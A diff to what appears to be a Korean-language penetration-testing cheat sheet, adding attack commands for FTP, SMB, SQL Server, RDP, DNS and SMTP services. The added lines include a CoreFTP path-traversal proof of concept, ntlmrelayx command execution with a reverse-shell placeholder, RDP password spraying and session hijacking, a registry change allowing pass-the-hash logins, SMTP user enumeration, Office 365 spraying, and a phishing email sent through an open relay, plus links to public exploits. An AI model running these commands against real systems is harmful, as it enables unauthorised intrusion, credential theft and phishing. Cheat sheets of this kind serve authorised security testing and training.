@@ -10,6 +10,7 @@
 ```nmap -Pn -v -n -p80 -b anonymous:password@192.168.1.1 172.16.0.1```
 
 ### CoreFTP Exploit (CVE-2022-22836)
+- https://www.exploit-db.com/exploits/50652
 ```curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops```
 
 <br/><br/>
@@ -66,6 +67,9 @@ rpcclient $> enumdomusers
 ### Impacket-ntlmrelayx를 사용한 명령 실행 (예 : Reverse Shell)
 ```impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>```
 
+## 'SMBGhost' Remote Code Execution
+- https://www.exploit-db.com/exploits/48537
+
 <br/><br/>
 # 3. SQL Databases
 
@@ -113,5 +117,105 @@ EXEC master..xp_subdirs '\\10.10.110.17\share\'
 
 ### linked Servers 식별
 ```SELECT srvname, isremote FROM sysservers```
-- `isremote`이 `1`은 원격 서버, `0`은 linked 서버를 의미
+- `isremote`이 `1`은 원격 서버, `0`은 linked 서버를 의미<br/>
 ```EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]```
+
+<br/><br/>
+# 4. RDP
+
+### Crowbar - Password Spraying
+```crowbar -b rdp -s 192.168.1.1/32 -U users.txt -c <password>```
+
+### Hydra - Password Spraying
+```hydra -L usernames.txt -p <password> 192.168.1.1 rdp```
+
+### RDP 세션 하이재킹 (Administrator 권한 필요, Server 2019 이전)
+```query user```<br/>
+```sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"```<br/>
+```net start sessionhijack```
+
+### (PtH)로 RDP GUI 접속 가능하도록 레지스트리 추가
+```reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f```
+
+## CVE-2019-0708 (BlueKeep)
+- https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/
+
+<br/><br/>
+# 5. DNS
+
+### DIG - AXFR Zone Transfer
+```dig AXFR @ns1.domain.com domain.com```
+
+### 루트 도메인의 모든 DNS서버 열거
+```fierce --domain zonetransfer.me```
+
+### 서브도메인 열거 - subfinder
+```./subfinder -d domain.com -v```
+
+### 서브도메인 열거 - subbrute (폐쇄망에서 유용)
+```
+echo "ns1.domain.com" > ./resolvers.txt
+./subbrute domain.com -s ./names.txt -r ./resolvers.txt
+```
+
+### CNAME 레코드 열거
+```host support.domain.com```<br/>
+```nslookup support.domain.com```
+
+<br/><br/>
+# 6. SMTP
+
+### Host - MX 레코드
+```host -t MX domain.com```
+
+### DIG - MX 레코드
+```dig mx domain.com | grep "MX" | grep -v ";"```
+
+### Host - A 레코드
+```host -t A mail1.domain.com```
+
+### VRFY 명령 (사용자 유효성 확인)
+```
+telnet 192.168.1.1 25
+VRFY <user>
+VRFY root
+VRFY www-data
+```
+
+### EXPN 명령 (사용자, 그룹의 모든 사용자 유효성 확인)
+```
+telnet 192.168.1.1 25
+EXPN support-team
+```
+
+### RCPT TO 명령 (메일 수신자 식별)
+```
+telnet 192.168.1.1 25
+RCPT TO:john
+```
+
+### USER 명령 (POP3용 사용자 체크)
+```
+telnet 192.168.1.1 25
+USER john
+```
+
+### 사용자 열거 자동화
+```smtp-user-enum -M RCPT -U userlist.txt -D domain.com -t 192.168.1.1```
+
+### 클라우드 - O365spray
+```python3 o365spray.py --validate --domain domain.com```<br/>
+```python3 o365spray.py --enum -U users.txt --domain domain.com```
+
+### Hydra - Password Attack
+```hydra -L users.txt -p <password> -f 192.168.1.1 pop3```
+
+### O365 Spray - Password Spraying
+```python3 o365spray.py --spray -U usersfound.txt -p <password> --count 1 --lockout 1 --domain domain.com```
+
+### Open Relay 서비스 이용하여 메일 발송
+```swaks --from notifications@domain.com --to employees@domain.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://domain.com/' --server 192.168.1.1```
+
+## OpenSMTPD 6.6.1 - Remote Code Execution
+- https://www.exploit-db.com/exploits/47984
+- 
